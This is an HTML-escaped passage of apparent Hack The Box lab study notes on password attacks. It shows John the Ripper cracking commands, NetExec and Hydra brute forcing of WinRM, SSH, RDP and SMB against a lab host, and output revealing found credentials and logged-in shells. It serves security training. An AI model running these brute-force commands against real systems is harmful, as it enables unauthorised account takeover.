      &lt;td&gt;SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;...&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;and many more.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;attack-methods&quot;&gt;Attack Methods&lt;/h4&gt;

&lt;h6 id=&quot;dictionary-attacks&quot;&gt;Dictionary Attacks&lt;/h6&gt;

&lt;p&gt;Dictionary attacks involve using a pre-generated list of words and phrases (known as a dictionary) to attempt to crack a password. This list of words and phrases is often acquired from various sources, such as publicly available dictionaries, leaked passwords, or even purchased from specialized companies. The dictionary is then used to generate a series of strings which are then used to compare against the hashed passwords. If a match is found, the password is cracked, providing an attacker access to the system and the data stored within it. This type of attack is highly effective. Therefore, it is essential to take the necessary steps to ensure that passwords are kept secure, such as using complex and unique passwords, regularly changing them, and using two-factor authentication.&lt;/p&gt;

&lt;h6 id=&quot;brute-force-attacks&quot;&gt;Brute Force Attacks&lt;/h6&gt;

&lt;p&gt;Brute force attacks involve attempting every conceivable combination of characters that could form a password. This is an extremely slow process, and using this method is typically only advisable if there are no other alternatives. It is also important to note that the longer and more complex the password, the more difficult it is to crack and the longer it will take to exhaust every combination. For this reason, it is highly recommended that passwords be at least 8 characters in length, with a combination of letters, numbers, and symbols.&lt;/p&gt;

&lt;h6 id=&quot;rainbow-table-attacks&quot;&gt;Rainbow Table Attacks&lt;/h6&gt;

&lt;p&gt;Rainbow table attacks involve using a pre-computed table of hashes and their corresponding plaintext passwords, which is a much faster method than a brute-force attack. However, this method is limited by the rainbow table size – the larger the table, the more passwords, and hashes it can store. Additionally, due to the nature of the attack, it is impossible to use rainbow tables to determine the plaintext of hashes not already included in the table. As a result, rainbow table attacks are only effective against hashes already present in the table, making the larger the table, the more successful the attack.&lt;/p&gt;

&lt;p&gt;John The Ripper&lt;/p&gt;

&lt;p&gt;single crack mode:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;hash_type&amp;gt; &amp;lt;&lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;or hash_file&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example, if we have a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashes_to_crack.txt&lt;/code&gt; that contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHA-256&lt;/code&gt; hashes, the command to crack them would be:&lt;/p&gt;

&lt;p&gt;wordlist:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;wordlist_file&amp;gt; &lt;span class=&quot;nt&quot;&gt;--rules&lt;/span&gt; &amp;lt;hash_file&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;cracking-files-with-john&quot;&gt;Cracking Files with John&lt;/h6&gt;

&lt;p&gt;Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Tool&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts PDF documents for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts SSH private keys for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mscash2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts MS Cash hashes for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keychain2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts OS X keychain files for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rar2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts RAR archives for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfx2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts PKCS#12 files for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;truecrypt_volume2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts TrueCrypt volumes for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts KeePass databases for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vncpcap2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts VNC PCAP files for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;putty2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts PuTTY private keys for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts ZIP archives for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hccap2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts WPA/WPA2 handshake captures for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;office2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts MS Office documents for John&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpa2john&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Converts WPA/WPA2 handshakes for John&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h6 id=&quot;winrm-1&quot;&gt;WinRM&lt;/h6&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winrm/portal&quot;&gt;Windows Remote Management&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt;) is the Microsoft implementation of the network protocol &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol&quot;&gt;Web Services Management Protocol&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WS-Management&lt;/code&gt;). It is a network protocol based on XML web services using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary&quot;&gt;Simple Object Access Protocol&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOAP&lt;/code&gt;) used for remote management of Windows systems. It takes care of the communication between &lt;a href=&quot;https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management&quot;&gt;Web-Based Enterprise Management&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WBEM&lt;/code&gt;) and the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page&quot;&gt;Windows Management Instrumentation&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WMI&lt;/code&gt;), which can call the &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0&quot;&gt;Distributed Component Object Model&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCOM&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5985&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5986&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;A handy tool that we can use for our password attacks is &lt;a href=&quot;https://github.com/Pennyw0rth/NetExec&quot;&gt;NetExec&lt;/a&gt;, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation for this tool to become familiar with it.&lt;/p&gt;

&lt;p&gt;usage:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nxc &amp;lt;proto&amp;gt; &amp;lt;target-IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &amp;lt;user or userlist&amp;gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;password or passwordlist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nxc winrm 10.129.42.197 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; user.list &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; password.list

WINRM       10.129.42.197   5985   NONE             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; None &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:10.129.42.197&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:None&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.129.42.197   5985   NONE             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] None&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser:password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The appearance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(Pwn3d!)&lt;/code&gt; is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;Evil-WinRM&lt;/a&gt;, which allows us to communicate with the WinRM service efficiently.&lt;/p&gt;

&lt;h6 id=&quot;installing-evil-winrm&quot;&gt;Installing Evil-WinRM&lt;/h6&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gem &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;hydra&quot;&gt;Hydra&lt;/h1&gt;

&lt;h2 id=&quot;ssh-1&quot;&gt;SSH&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.ssh.com/academy/ssh/protocol&quot;&gt;Secure Shell&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 22&lt;/code&gt; by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;symmetric&lt;/code&gt; encryption, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asymmetric&lt;/code&gt; encryption, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashing&lt;/code&gt;.&lt;/p&gt;

&lt;h6 id=&quot;symmetric-encryption&quot;&gt;Symmetric Encryption&lt;/h6&gt;

&lt;p&gt;Symmetric encryption uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;same key&lt;/code&gt; for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The &lt;a href=&quot;https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange&quot;&gt;Diffie-Hellman&lt;/a&gt; key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.&lt;/p&gt;

&lt;h6 id=&quot;asymmetrical-encryption&quot;&gt;Asymmetrical Encryption&lt;/h6&gt;

&lt;p&gt;Asymmetric encryption uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;two SSH keys&lt;/code&gt;: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.&lt;/p&gt;

&lt;h4 id=&quot;hashing&quot;&gt;Hashing&lt;/h4&gt;

&lt;p&gt;The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.&lt;/p&gt;

&lt;h6 id=&quot;hydra---ssh&quot;&gt;Hydra - SSH&lt;/h6&gt;

&lt;p&gt;We can use a tool such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hydra&lt;/code&gt; to brute force SSH. This is covered in-depth in the &lt;a href=&quot;https://academy.hackthebox.com/course/preview/login-brute-forcing&quot;&gt;Login Brute Forcing&lt;/a&gt; module.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; user.list &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.list ssh://10.129.42.197

Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2022-01-10 15:03:51
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:5/p:5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~2 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.129.42.197:22/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.&lt;/p&gt;

&lt;p&gt;Network Services&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh user@10.129.42.197

The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;10.129.42.197 (10.129.42.197)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added &apos;&lt;/span&gt;10.129.42.197&lt;span class=&quot;s1&quot;&gt;&apos; (ECDSA) to the list of known hosts.


user@10.129.42.197&apos;&lt;/span&gt;s password: &lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;

Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.1637]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h6 id=&quot;remote-desktop-protocol-rdp&quot;&gt;Remote Desktop Protocol (RDP)&lt;/h6&gt;

&lt;p&gt;Microsoft’s &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol&quot;&gt;Remote Desktop Protocol&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDP&lt;/code&gt;) is a network protocol that allows remote access to Windows systems via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 3389&lt;/code&gt; by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions&lt;/p&gt;

&lt;h6 id=&quot;hydra---rdp&quot;&gt;Hydra - RDP&lt;/h6&gt;

&lt;p&gt;We can also use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hydra&lt;/code&gt; to perform RDP bruteforcing.&lt;/p&gt;

&lt;p&gt;Network Services&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; user.list &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.list rdp://10.129.42.197
&lt;span class=&quot;go&quot;&gt;
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don&apos;t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Linux offers different clients to communicate with the desired server using the RDP protocol. These include &lt;a href=&quot;https://remmina.org/&quot;&gt;Remmina&lt;/a&gt;, &lt;a href=&quot;http://www.rdesktop.org/&quot;&gt;rdesktop&lt;/a&gt;, &lt;a href=&quot;https://linux.die.net/man/1/xfreerdp&quot;&gt;xfreerdp&lt;/a&gt;, and many others. For our purposes, we will work with xfreerdp.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfreerdp /v:&amp;lt;target-IP&amp;gt; /u:&amp;lt;username&amp;gt; /p:&amp;lt;password&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/RDP.png&quot; alt=&quot;Windows Control Panel displaying various settings like Administrative Tools, Device Manager, and User Accounts.&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;hydra---smb&quot;&gt;Hydra - SMB&lt;/h4&gt;

&lt;p&gt;Network Services&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hydra &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; user.list &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password.list smb://10.129.42.197

Hydra v9.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 by van Hauser/THC &amp;amp; David Maciejak - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is non-binding, these &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; ignore laws and ethics anyway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2022-01-06 19:37:31
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Reduced number of tasks to 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;smb does not like parallel connections&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 1 task per 1 server, overall 1 task, 25 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:5236/p:4987234&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~25 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking smb://10.129.42.197:445/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h6 id=&quot;smbclient&quot;&gt;smbclient&lt;/h6&gt;
&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; user &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;10.129.42.197&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;SHARENAME
&lt;span class=&quot;go&quot;&gt;
Enter WORKGROUP\user&apos;s password: *******

Try &quot;help&quot; to get a list of possible commands.


&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;smb: \&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;smb: \&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;password-mutations&quot;&gt;Password Mutations&lt;/h5&gt;

&lt;hr /&gt;

&lt;p&gt;Many people create their passwords according to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;simplicity instead of security&lt;/code&gt;. To eliminate this human weakness that often compromises security measures, password policies can be created on all systems that determine how a password should look. This means that the system recognizes whether the password contains capital letters, special characters, and numbers. In addition, most password policies require a minimum length of eight characters in a password, including at least one of the above specifications.&lt;/p&gt;

&lt;p&gt;In the previous sections, we guessed very simple passwords, but it becomes much more difficult to adapt this to systems that apply password policies that force the creation of more complex passwords.&lt;/p&gt;

